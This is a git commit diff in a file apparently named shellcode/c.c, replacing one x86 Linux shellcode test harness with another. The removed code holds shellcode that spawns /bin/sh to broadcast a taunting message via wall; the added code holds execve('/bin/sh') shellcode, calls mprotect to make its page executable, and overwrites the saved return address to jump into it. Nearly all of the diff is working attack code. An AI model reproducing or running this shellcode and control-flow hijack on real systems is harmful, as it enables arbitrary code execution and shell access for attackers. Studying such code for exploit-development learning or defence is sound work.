4b9aa8f7a6b95d3dbf2fe0846f8937f3165a3089
Artyom Vybornov <art-vybor@ya.ru>
2015-01-13 19:37:23 +0300

    add shelcode

--- shellcode/c.c
+++ shellcode/c.c
@@ -1,34 +1,27 @@
-int main(void)
-{
-    char evil[] =  
- 
-        "\x6a\x0b"              // push   $0xb
-        "\x58"                  // pop    %eax
-        "\x99"                  // cltd
-        "\x52"                  // push   %edx
-        "\x68\x77\x61\x6c\x6c"  // push   $0x6c6c6177
-        "\x68\x21\x20\x7c\x20"  // push   $0x207c2021
-        "\x68\x63\x6b\x33\x64"  // push   $0x64336b63
-        "\x68\x20\x50\x68\x75"  // push   $0x75685020
-        "\x68\x65\x63\x68\x6f"  // push   $0x6f686365
-        "\x89\xe6"              // mov    %esp,%esi
-        "\x52"                  // push   %edx
-        "\x66\x68\x2d\x63"      // pushw  $0x632d
-        "\x89\xe1"              // mov    %esp,%ecx
-        "\x52"                  // push   %edx
-        "\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
-        "\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
-        "\x89\xe3"              // mov    %esp,%ebx
-        "\x52"                  // push   %edx
-        "\x56"                  // push   %esi
-        "\x51"                  // push   %ecx
-        "\x53"                  // push   %ebx
-        "\x89\xe1"              // mov    %esp,%ecx
-        "\xcd\x80";              // int    $0x80
- 
- 
-    void(*boom)()=(void*)evil;
-    boom();
- 
+#include <sys/mman.h>
+
+#define PAGE_SIZE 4096U
+
+// The trailing null byte is implied because this is a string
+char shellcode[] = {
+    "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
+    "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
+    "\x6e\x2f\x73\x68"
+};
+
+void test_shellcode(int dummy) {
+
+    char **ptr = (char **)&dummy;
+
+    // The data section is non-executable
+    // Change protection bits for the page containing our shellcode
+    mprotect((void *)((unsigned int)shellcode & ~(PAGE_SIZE - 1)), 2 * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+    ptr--;          // Point to saved EIP
+    *ptr = shellcode;
+}
+
+int main() {
+    test_shellcode(0);  
     return 0;
 }
